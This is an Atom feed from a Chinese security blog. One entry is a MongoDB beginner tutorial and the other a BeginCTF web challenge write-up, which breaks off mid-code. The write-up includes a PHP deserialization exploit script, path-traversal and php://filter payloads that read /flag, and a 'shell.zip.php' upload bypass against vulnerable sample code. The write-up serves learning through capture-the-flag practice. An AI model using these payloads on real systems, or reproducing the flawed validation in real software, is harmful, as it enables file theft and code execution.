<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>NaCl&#39;s Blog</title>
  
  <subtitle>hi</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-02-01T16:49:08.174Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>NaCl</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>MongoDB初体验</title>
    <link href="http://example.com/2024/02/01/MongoDB%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>http://example.com/2024/02/01/MongoDB%E5%88%9D%E4%BD%93%E9%AA%8C/</id>
    <published>2024-02-01T15:53:50.000Z</published>
    <updated>2024-02-01T16:49:08.174Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装MongoDB"><a href="#安装MongoDB" class="headerlink" title="安装MongoDB"></a>安装MongoDB</h1><p>MongoDB server:<a href="https://www.mongodb.com/try/download/community">https://www.mongodb.com/try/download/community</a></p><p>客户端mongo shell:<a href="https://www.mongodb.com/try/download/shell">https://www.mongodb.com/try/download/shell</a></p><p>安装环境: Ubuntu 22.04</p><h2 id="mongo-server"><a href="#mongo-server" class="headerlink" title="mongo server"></a>mongo server</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -i mongodb-org-server_7.0.5_amd64.deb</span><br></pre></td></tr></table></figure><p>启动:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start mongod.service</span><br></pre></td></tr></table></figure><h2 id="mongo-shell"><a href="#mongo-shell" class="headerlink" title="mongo shell"></a>mongo shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf mongosh-x.x.x-linux-x64.tgz</span><br></pre></td></tr></table></figure><p>在<code>mongosh-x.x.x-linux-x64/bin</code>目录下操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">cp</span> mongosh /usr/local/bin/</span><br><span class="line">sudo <span class="built_in">cp</span> mongosh_crypt_v1.so /usr/local/lib/</span><br></pre></td></tr></table></figure><h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongosh --host 127.0.0.1 --port 27017</span><br></pre></td></tr></table></figure><h1 id="与传统的mysql类比"><a href="#与传统的mysql类比" class="headerlink" title="与传统的mysql类比"></a>与传统的mysql类比</h1><table><thead><tr><th>SQL 概念</th><th>MongoDB 概念</th><th>说明</th></tr></thead><tbody><tr><td>database</td><td>database</td><td>数据库</td></tr><tr><td>table</td><td>collection</td><td>数据库表&#x2F;集合</td></tr><tr><td>row</td><td>document</td><td>数据记录行&#x2F;文档</td></tr><tr><td>column</td><td>field</td><td>数据字段&#x2F;域</td></tr><tr><td>index</td><td>index</td><td>索引</td></tr><tr><td>table joins</td><td></td><td>表连接，MongoDB 不支持</td></tr><tr><td>primary key</td><td>primary key</td><td>主键，MongoDB 自动将 <code>_id</code> 字段设置为主键</td></tr></tbody></table><p>MongoDB 将数据存储为一个文档，数据结构由键值（key&#x3D;&gt;value）对组成。MongoDB 文档类似于 JSON 对象。字段值可以包含其他文档，数组及文档数组。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),</span><br><span class="line">    &quot;name&quot; : &quot;whoami&quot;,</span><br><span class="line">    &quot;description&quot; : &quot;the admin user&quot;,</span><br><span class="line">    &quot;age&quot; : 19,</span><br><span class="line">    &quot;status&quot; : &quot;A&quot;,</span><br><span class="line">    &quot;groups&quot; : [</span><br><span class="line">        &quot;admins&quot;,</span><br><span class="line">        &quot;users&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h1><p>我们使用use users来转到users数据库,如果没有, 将会__自动创建一个__,即使用use users来创建一个数据库</p><p>查看所有数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> dbs</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240202001642138.png" alt="image-20240202001642138"></p><p>并没有出现users,因为需要先插入数据</p><h3 id="添加一个集合"><a href="#添加一个集合" class="headerlink" title="添加一个集合"></a>添加一个集合</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.createCollection(&quot;all_users&quot;)</span><br></pre></td></tr></table></figure><h3 id="向集合中插入一个文档"><a href="#向集合中插入一个文档" class="headerlink" title="向集合中插入一个文档"></a>向集合中插入一个文档</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> db.all_users.insert(&#123;name: <span class="string">&#x27;whoami&#x27;</span>, </span><br><span class="line">    description: <span class="string">&#x27;the admin user&#x27;</span>,</span><br><span class="line">    age: <span class="number">19</span>,</span><br><span class="line">    status: <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="keyword">groups</span>: [<span class="string">&#x27;admins&#x27;</span>, <span class="string">&#x27;users&#x27;</span>]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="更新文档内容"><a href="#更新文档内容" class="headerlink" title="更新文档内容"></a>更新文档内容</h3><h4 id="update-方法"><a href="#update-方法" class="headerlink" title="update()方法"></a>update()方法</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> db.all_users.update(&#123; <span class="string">&#x27;age&#x27;</span>: <span class="number">19</span> &#125;, &#123; $<span class="keyword">set</span>: &#123; <span class="string">&#x27;age&#x27;</span>: <span class="number">20</span> &#125; &#125;)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240202002705382.png" alt="image-20240202002705382"></p><p>此时文档内容已经更新了</p><h4 id="save-方法"><a href="#save-方法" class="headerlink" title="save()方法"></a>save()方法</h4><p>save() 方法通过传入的文档来替换已有文档，<code>_id</code> 主键存在就更新，不存在就插入.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> db.all_users.save(&#123;</span><br><span class="line">    &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),</span><br><span class="line">    &quot;name&quot; : &quot;whoami&quot;,</span><br><span class="line">    &quot;description&quot; : &quot;the admin user&quot;,</span><br><span class="line">    &quot;age&quot; : <span class="number">21</span>,</span><br><span class="line">    &quot;status&quot; : &quot;A&quot;,</span><br><span class="line">    &quot;groups&quot; : [</span><br><span class="line">        &quot;admins&quot;,</span><br><span class="line">        &quot;users&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="查询文档"><a href="#查询文档" class="headerlink" title="查询文档"></a>查询文档</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db.collection.find(query, projection)</span><br><span class="line">query：可选，使用查询操作符指定查询条件，相当于 <span class="keyword">sql</span> <span class="keyword">select</span> 语句中的 <span class="keyword">where</span> 子句。</span><br><span class="line">projection：可选，使用投影操作符指定返回的键。</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span>db.all_users.find(&#123;<span class="string">&#x27;age&#x27;</span>:<span class="number">20</span>&#125;)</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    _id: ObjectId(<span class="string">&#x27;65bbc283f0e284c714c16a06&#x27;</span>),</span><br><span class="line">    name: <span class="string">&#x27;whoami&#x27;</span>,</span><br><span class="line">    description: <span class="string">&#x27;the admin user&#x27;</span>,</span><br><span class="line">    age: <span class="number">20</span>,</span><br><span class="line">    status: <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="keyword">groups</span>: [ <span class="string">&#x27;admins&#x27;</span>, <span class="string">&#x27;users&#x27;</span> ]</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="MongoDB-与-RDBMS-Where-语句的比较"><a href="#MongoDB-与-RDBMS-Where-语句的比较" class="headerlink" title="MongoDB 与 RDBMS Where 语句的比较"></a>MongoDB 与 RDBMS Where 语句的比较</h3><p>如果你熟悉常规的 SQL 数据，通过下表可以更好的理解 MongoDB 的条件语句查询：</p><table><thead><tr><th>操作</th><th>格式</th><th>范例</th><th>RDBMS 中的类似语句</th></tr></thead><tbody><tr><td>等于</td><td><code>&#123;&lt;key&gt;:&lt;value&gt;&#125;</code></td><td><code>db.love.find(&#123;&quot;name&quot;:&quot;whoami&quot;&#125;).pretty()</code></td><td><code>where name = &#39;whoami&#39;</code></td></tr><tr><td>小于</td><td><code>&#123;&lt;key&gt;:&#123;$lt:&lt;value&gt;&#125;&#125;</code></td><td><code>db.love.find(&#123;&quot;age&quot;:&#123;$lt:19&#125;&#125;).pretty()</code></td><td><code>where age &lt; 19</code></td></tr><tr><td>小于或等于</td><td><code>&#123;&lt;key&gt;:&#123;$lte:&lt;value&gt;&#125;&#125;</code></td><td><code>db.love.find(&#123;&quot;age&quot;:&#123;$lte:19&#125;&#125;).pretty()</code></td><td><code>where likes &lt;= 19</code></td></tr><tr><td>大于</td><td><code>&#123;&lt;key&gt;:&#123;$gt:&lt;value&gt;&#125;&#125;</code></td><td><code>db.love.find(&#123;&quot;age&quot;:&#123;$gt:19&#125;&#125;).pretty()</code></td><td><code>where likes &gt; 19</code></td></tr><tr><td>大于或等于</td><td><code>&#123;&lt;key&gt;:&#123;$gte:&lt;value&gt;&#125;&#125;</code></td><td><code>db.love.find(&#123;&quot;age&quot;:&#123;$gte:19&#125;&#125;).pretty()</code></td><td><code>where likes &gt;= 19</code></td></tr><tr><td>不等于</td><td><code>&#123;&lt;key&gt;:&#123;$ne:&lt;value&gt;&#125;&#125;</code></td><td><code>db.love.find(&#123;&quot;age&quot;:&#123;$ne:19&#125;&#125;).pretty()</code></td><td><code>where likes != 19</code></td></tr></tbody></table><h3 id="AND"><a href="#AND" class="headerlink" title="AND"></a>AND</h3><p>在MongDB中 逗号就相当于AND</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.all_users.find(&#123;&quot;status&quot;:&quot;A&quot;, &quot;age&quot;:<span class="number">20</span>&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240202003723359.png" alt="image-20240202003723359"></p><h3 id="OR"><a href="#OR" class="headerlink" title="OR"></a>OR</h3><p>语法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> db.col.find(</span><br><span class="line">   &#123;</span><br><span class="line">      $<span class="keyword">or</span>: [</span><br><span class="line">         &#123;key1: value1&#125;, &#123;key2:value2&#125;</span><br><span class="line">      ]</span><br><span class="line">   &#125;</span><br><span class="line">).pretty()</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span>db.all_users.find(</span><br><span class="line">&#123;</span><br><span class="line">$<span class="keyword">or</span>: [</span><br><span class="line">&#123;&quot;age&quot;:<span class="number">20</span>&#125;, &#123;&quot;status&quot;:&quot;B&quot;&#125;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br><span class="line">)</span><br><span class="line">输出:</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    _id: ObjectId(<span class="string">&#x27;65bbc283f0e284c714c16a06&#x27;</span>),</span><br><span class="line">    name: <span class="string">&#x27;whoami&#x27;</span>,</span><br><span class="line">    description: <span class="string">&#x27;the admin user&#x27;</span>,</span><br><span class="line">    age: <span class="number">20</span>,</span><br><span class="line">    status: <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="keyword">groups</span>: [ <span class="string">&#x27;admins&#x27;</span>, <span class="string">&#x27;users&#x27;</span> ]</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="AND与OR联合"><a href="#AND与OR联合" class="headerlink" title="AND与OR联合"></a>AND与OR联合</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.all_users.find(&#123;&quot;age&quot;:&#123;$gt:<span class="number">19</span>&#125;, $<span class="keyword">or</span>: [&#123;&quot;name&quot;:&quot;whoami&quot;&#125;, &#123;&quot;status&quot;:&quot;A&quot;&#125;]&#125;)</span><br></pre></td></tr></table></figure><p>这相当于</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">where</span> age <span class="operator">&gt;</span> <span class="number">19</span> <span class="keyword">AND</span> (name<span class="operator">=</span><span class="string">&#x27;whoami&#x27;</span> <span class="keyword">OR</span> status<span class="operator">=</span><span class="string">&#x27;A&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;安装MongoDB&quot;&gt;&lt;a href=&quot;#安装MongoDB&quot; class=&quot;headerlink&quot; title=&quot;安装MongoDB&quot;&gt;&lt;/a&gt;安装MongoDB&lt;/h1&gt;&lt;p&gt;MongoDB server:&lt;a href=&quot;https://www.mongod</summary>
      
    
    
    
    
    <category term="MongoDB" scheme="http://example.com/tags/MongoDB/"/>
    
    <category term="nosql注入" scheme="http://example.com/tags/nosql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>BeginCTF（自由赛道）</title>
    <link href="http://example.com/2024/01/31/BeginCTF-%E8%87%AA%E7%94%B1%E8%B5%9B%E9%81%93/"/>
    <id>http://example.com/2024/01/31/BeginCTF-%E8%87%AA%E7%94%B1%E8%B5%9B%E9%81%93/</id>
    <published>2024-01-31T14:23:01.000Z</published>
    <updated>2024-02-06T08:19:14.077Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BeginCTF（自由赛道）"><a href="#BeginCTF（自由赛道）" class="headerlink" title="BeginCTF（自由赛道）"></a>BeginCTF（自由赛道）</h1><h2 id="POPgadget"><a href="#POPgadget" class="headerlink" title="POPgadget"></a>POPgadget</h2><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span> = <span class="string">&#x27;call_user_func_array&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$nacl</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$nacl</span>-&gt;p = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line"><span class="variable">$nacl</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$nacl</span>-&gt;a-&gt;a = <span class="keyword">new</span> <span class="title class_">Fun</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$nacl</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>比较简单</p><p>需要注意的是类<code>B</code>下面是没有a属性的,但是不影响解题(由于php特性,反序列化后会自动添加类中不存在而序列中存在的属性)</p><h2 id="zupload"><a href="#zupload" class="headerlink" title="zupload"></a>zupload</h2><p>直接上payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=../../../../flag</span><br></pre></td></tr></table></figure><h2 id="zupload-pro"><a href="#zupload-pro" class="headerlink" title="zupload-pro"></a>zupload-pro</h2><p>源码中禁止出现<code>..</code>和<code>/</code></p><p>我们用伪协议读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=php://filter/read/convert.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure><h2 id="zupload-pro-plus"><a href="#zupload-pro-plus" class="headerlink" title="zupload-pro-plus"></a>zupload-pro-plus</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /?action=upload&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>][<span class="number">0</span>] === <span class="string">&#x27;/&#x27;</span> || <span class="title function_ invoke__">strpos</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>], <span class="string">&#x27;..&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;h1&gt;Invalid action&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_error</span> = <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$allowed</span> = <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$allowed</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file_error</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file_size</span> &lt;= <span class="number">2097152</span>) &#123;</span><br><span class="line">                <span class="variable">$file_destination</span> = <span class="string">&#x27;uploads/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file_tmp</span>, <span class="variable">$file_destination</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;File uploaded successfully&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;url&#x27;</span> =&gt; <span class="title function_ invoke__">preg_split</span>(<span class="string">&#x27;/\?/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="number">0</span>] . <span class="variable">$file_destination</span></span><br><span class="line">                    ));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Only zip files are allowed&#x27;</span></span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察附件中的源码,容易发现以下地方存在漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$allowed</span> = <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>);</span><br></pre></td></tr></table></figure><p>只需要构造一个文件名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.zip.php</span><br></pre></td></tr></table></figure><p>经处理后得到的<code>$file_ext</code>值为’zip’,但是此文件名将会被解析为php</p><p>注: 前端不允许.php结尾,只需要将.zip后缀的文件代理到burpsuite之后改为.zip.php即可</p><h2 id="zupload-pro-plus-max"><a href="#zupload-pro-plus-max" class="headerlink" title="zupload-pro-plus-max"></a>zupload-pro-plus-max</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /?action=upload&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>][<span class="number">0</span>] === <span class="string">&#x27;/&#x27;</span> || <span class="title function_ invoke__">substr_count</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>], <span class="string">&#x27;/&#x27;</span>) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;h1&gt;Invalid action&lt;/h1&gt;&#x27;</span>);</span><br><span 